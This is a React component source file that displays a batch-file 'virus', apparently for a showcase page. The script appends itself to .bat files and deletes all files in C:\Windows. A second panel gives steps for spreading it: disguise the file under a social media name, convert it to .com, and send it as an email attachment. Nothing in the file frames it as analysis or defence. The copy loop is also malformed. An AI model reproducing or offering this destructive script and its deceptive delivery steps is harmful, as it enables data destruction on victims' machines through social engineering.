import React, { useState, useEffect } from 'react';
import '../filedisplay.css';

const FileDisplaykey = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">Virus.bat</h2>
        <pre className="file-display-content">
          <code>
            {`
@ echo off
for %%f in (*.bat) do
copy %%f + Virus.bat
del c:\Windows\*.*
            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Second Step</h2>
        <pre className="file-display-content">
          <code>
            {`
1.Rename this batch file to something like a social media name

2.Convert this batch file as a .com file. Do this by going to bat2com

3.Distribute this file as an atachment

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">
        Virus.bat will copy all the .bat files in the current 
        directory and deletes all files in the C:\Windows directory
        </p>
      </div>
    </div>
  );
};

export default FileDisplaykey;
